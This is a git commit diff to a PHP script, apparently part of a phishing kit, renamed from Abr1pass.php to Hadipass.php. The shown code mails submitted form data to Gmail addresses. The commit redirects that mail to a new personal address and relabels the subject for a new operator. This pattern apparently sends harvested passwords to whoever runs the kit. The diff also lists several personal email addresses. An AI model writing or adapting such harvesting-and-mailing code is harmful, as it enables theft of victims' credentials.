e99ff88324f5a2de242487ae0961e186db97d09c
advastong542 <advastingteam51@gmail.com>
2025-07-15 18:51:23 +0500

    Update and rename Abr1pass.php to Hadipass.php

--- Hadipass.php
+++ Hadipass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'password');
-        $mail->addAddress('tiktokworkings218@gmail.com');
+        $mail->addAddress('abdul.hadi.nizamani.com@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'abr1';
+        $mail->Subject = 'hadi';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
